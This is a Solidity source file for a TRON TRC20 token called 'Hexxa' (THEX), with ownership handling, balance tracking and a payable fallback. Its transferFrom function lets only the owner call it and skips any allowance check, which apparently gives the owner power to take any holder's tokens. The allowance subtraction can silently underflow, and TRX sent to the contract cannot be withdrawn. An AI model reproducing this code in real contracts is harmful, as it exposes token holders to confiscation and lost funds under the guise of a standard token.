//SourceUnit: TRONHEXX_FINAL.sol

pragma solidity ^0.4.25;

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

// ----------------------------------------------------------------------------
// TRON TRC20
// ----------------------------------------------------------------------------
contract TRC20Interface {
  function totalSupply() public constant returns (uint);
  function balanceOf(address tokenOwner) public constant returns (uint balance);
  function allowance(address tokenOwner, address spender) public constant returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);
  
  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

// ----------------------------------------------------------------------------
// Owned contract
// ----------------------------------------------------------------------------
contract Owned {
  address public owner;
  address public newOwner;
  
  event OwnershipTransferred(address indexed _from, address indexed _to);
  event ReceiveTRX(address sender, uint amount);
  
  constructor() public {
    owner = msg.sender;
  }
  
  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }
  
  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }
  function acceptOwnership() public {
    require(msg.sender == newOwner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    newOwner = address(0);
  }
}

// ----------------------------------------------------------------------------
// NAME : TRON HEXX TOKEN
// TRON HEXX TOKEN
// ----------------------------------------------------------------------------
contract TRONHEXXA is Owned, TRC20Interface {
  string public symbol;
  string public name;
  
  // support variable
  uint public decimals;
  uint public _mega;
  
  uint _totalSupply;
  
  uint _playCount;
  uint _winCount;
  uint _totalBet;
  uint _totalReward;
  
  mapping(address => uint) balances;
  mapping(address => mapping (address => uint256)) allowed;
  mapping (address => uint256) public receivedTRX;
  
  event ReceiveTRX(address buyer, uint256 amount);
     
  constructor() public{
    _mega = 1000000;
    decimals = 6;
    
    symbol = "THEX";
    name = "Hexxa";
    _totalSupply = 10000 * _mega * 10**decimals;
    balances[owner] = _totalSupply;
    
    _playCount  = 0;
    _winCount   = 0;
    _totalBet   = 0;
    _totalReward= 0;
    
    emit Transfer(address(0), owner, _totalSupply);
  }
  
  // ----------------------------------------------------------------------------
  // TRC20
  // ----------------------------------------------------------------------------
  function totalSupply() public view returns (uint amount){
    return _totalSupply;
  }
  
  function balanceOf(address tokenOwner) public view returns (uint balance) {
    return balances[tokenOwner];
  }
  
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  
  function transfer(address to, uint tokens) public returns (bool success){
    require(balances[msg.sender] >= tokens);    
    balances[msg.sender] = balances[msg.sender] - tokens;
    balances[to] = balances[to] + tokens;
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  
  function approve(address spender, uint tokens) public returns (bool success){
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  
  function transferFrom(address from, address to, uint tokens) public returns (bool success){
    
    require(msg.sender == address(owner));
    
    require(balances[from] >= tokens);
    balances[from] = balances[from] - tokens;
    allowed[from][msg.sender] = allowed[from][msg.sender] -tokens;
    balances[to] = balances[to] + tokens;
    emit Transfer(from, to, tokens);
    return true;
  }
   
  
  function() payable public {
    receivedTRX[msg.sender] = msg.value;
    emit ReceiveTRX(msg.sender, msg.value);
  }
  
 
  
  // ----------------------------------------------------------------------------
  // INFO  
  // ----------------------------------------------------------------------------  
  function balance() view returns (uint256 balance){
    address cont = address(this);    
    return cont.balance; 
  }
  
  function balanceToken() view returns (uint256 balance){
    address ownAddress = address(owner);    
    return balances[ownAddress];   
  }
  
 
}